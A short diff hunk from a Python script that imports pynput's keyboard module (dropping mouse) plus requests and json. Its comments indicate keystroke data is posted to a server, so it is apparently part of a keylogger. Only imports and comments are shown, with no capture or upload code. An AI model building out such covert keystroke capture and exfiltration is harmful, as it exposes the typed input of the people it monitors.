@@ -1,6 +1,6 @@
 # Install pynput using the following command: pip install pynput
 # Import the mouse and keynboard from pynput
-from pynput import mouse, keyboard
+from pynput import keyboard
 # We need to import the requests library to Post the data to the server.
 import requests
 # To transform a Dictionary to a JSON string we need the json package.
